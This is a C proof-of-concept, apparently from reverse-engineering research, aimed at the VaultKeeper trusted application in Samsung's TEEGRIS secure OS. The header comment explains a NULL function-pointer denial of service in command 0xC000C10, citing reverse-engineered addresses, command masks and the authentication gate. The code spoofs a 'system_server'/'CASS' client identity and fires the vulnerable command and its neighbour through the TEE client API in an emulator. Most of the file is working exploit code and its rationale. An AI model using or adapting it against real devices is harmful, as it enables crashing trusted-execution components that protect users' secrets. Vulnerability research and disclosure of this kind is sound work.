/* vltkpr (VaultKeeper) cmd 0xC000C10 VERIFY_CERT — NULL fn-ptr DoS.
 *
 * Source finding: RE/samsung_teegris/vltkpr.md §"FINDING — MEDIUM (DoS)".
 * vk_switcher (RE @0x17770) dispatches inner cmd 0xC000C10 through handler
 * slot v46[1], which is NEVER assigned in either the cp or everyman vtable
 * setup (only v46[0] = vk_everyman_write_unsheltered is stored). The would-be
 * handler vk_crypto_check_server_cert_chain (@0x23C4C) has 0 xrefs (dead).
 * So cmd 0xC000C10 -> blr through NULL -> branch to PC 0 -> fetch fault.
 *
 * Reachability (RE):
 *   - vk_switcher reads the inner cmd from req[0] (the GP cmd-id is ignored).
 *   - get_vtab_index() matches req+0x08 client_name[128] AND req+0x88
 *     vault_name[32] against the 22-entry VTAB. idx 6 = (system_server, CASS)
 *     -> client_class 2.
 *   - class-2 cmd mask 0x04076E97, base 0xC000C02: bit (0x10-0x02)=14 is set
 *     -> cmd 0xC000C10 passes the per-class mask. (class 3 mask 0x1A7F87FF
 *      base 0xC000C03: bit 13 clear -> class-3 cannot reach this cmd.)
 *
 * Gate BEFORE the dispatch: TA_InvokeCommandEntryPoint calls vk_authenticate_ca
 * (RE @0x1C850) first, which round-trips PROCA via PlatformCallDriver ->
 * open("/dev/pa_driver")/ioctl(fd,42,buf)/close. The emulator models open/close
 * but NOT ioctl -> default_func -> emu_stop. So a naive run HALTS at the PROCA
 * ioctl before reaching vk_switcher. On a real custom-kernel / PROCA-stripped
 * device vk_authenticate_ca soft-passes (returns 0) — Phase B models that by
 * stubbing vk_authenticate_ca via a .json inline hook so the dispatch is reached.
 *
 * param shape (RE): MEMREF_INOUT req (0xADF8) + MEMREF_INOUT rsp (0xAE00).
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

#define VK_REQ_SIZE 0xADF8u
#define VK_RSP_SIZE 0xAE00u
#define VK_CMD_VERIFY_CERT 0x0C000C10u

#define OFF_CMD_NO       0x00
#define OFF_RESULT       0x04
#define OFF_CLIENT_NAME  0x08   /* client_name[128] */
#define OFF_VAULT_NAME   0x88   /* vault_name[32]   */

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

static uint32_t fire(TEEC_Session *s, uint32_t cmd, uint8_t *req, uint32_t rqsz,
                     uint8_t *resp, uint32_t rpsz, const char *label)
{
    TEEC_Operation op; uint32_t eo = 0;
    memset(&op, 0, sizeof(op));
    /* vltkpr's dispatcher checks the RAW param-type nibbles: (pt & 0xf)==7 for
     * param[0] (RE @0x1a218) and (pt & 0xf0)==0x60 for param[1] (RE @0x1a234).
     * i.e. req=INOUT(7), rsp=OUTPUT(6) — asymmetric. The emulator passes the
     * TEEC wire paramTypes to the TA with NO TEEC->TEE translation, so we send
     * those exact nibbles. (param[1]==7 fails -> -30002 BAD_PARAMETERS, the
     * "rsp is null" branch.) */
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = req;  op.params[0].tmpref.size = rqsz;
    op.params[1].tmpref.buffer = resp; op.params[1].tmpref.size = rpsz;
    printf("[poc] >>> gp_cmd=0x%x inner_cmd=%-12s req_size=0x%x resp_size=0x%x\n",
           cmd, label, rqsz, rpsz);
    TEEC_Result r = TEEC_InvokeCommand_impl(s, cmd, &op, &eo);
    printf("[poc] <<< ret=0x%x (%d) origin=0x%x\n", r, (int)r, eo);
    return r;
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-564c544b5052";   /* VLTKPR */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    uint8_t *req  = (uint8_t*)allocate_param_mem(&context, 0xB000);
    uint8_t *resp = (uint8_t*)allocate_param_mem(&context, 0xB000);
    if (!req || !resp) { printf("[poc] alloc failed\n"); exit(-1); }

    /* Drive two inner commands with the SAME class-2 identity (system_server /
     * CASS -> get_vtab_index -> class 2). The CORPUS build's class-2 command
     * mask (vk_switcher @corpus 0x15414) is 0x040780D7, base 0xC000C02 (bit =
     * cmd - 0xC000C02): bit 14 (cmd 0xC000C10) is CLEAR, bit 15 (cmd 0xC000C11)
     * is SET. The A556B build the finding was made on used mask 0x04076E97 where
     * bit 14 WAS set. So on this corpus build 0xC000C10 must be rejected
     * -30004 (Command not defined / out-of-mask) while its neighbour 0xC000C11
     * passes the mask -- proving the *command mask* (a build-delta'd check), not
     * the credential gate, is what blocks the documented VERIFY_CERT NULL-blr. */
    const uint32_t cmds[2] = { VK_CMD_VERIFY_CERT, VK_CMD_VERIFY_CERT + 1 };
    const char *labels[2]  = { "0xC000C10(b14)", "0xC000C11(b15)" };
    for (int i = 0; i < 2; i++) {
        memset(req, 0, 0xB000);
        *(uint32_t*)(req + OFF_CMD_NO) = cmds[i];
        *(uint32_t*)(req + OFF_RESULT) = cmds[i];   /* mask field is req[4] */
        strcpy((char*)(req + OFF_CLIENT_NAME), "system_server");
        strcpy((char*)(req + OFF_VAULT_NAME), "CASS");
        memset(resp, 0, 0xB000);
        printf("[poc] --- firing inner cmd 0x%X (%s) ---\n", cmds[i], labels[i]);
        fire(&session, 0 /*gp cmd ignored*/, req, VK_REQ_SIZE, resp, VK_RSP_SIZE, labels[i]);
    }
    printf("[poc] (done -- ret -30004/0xFFFF8ACC = out-of-mask; anything else = passed the mask)\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
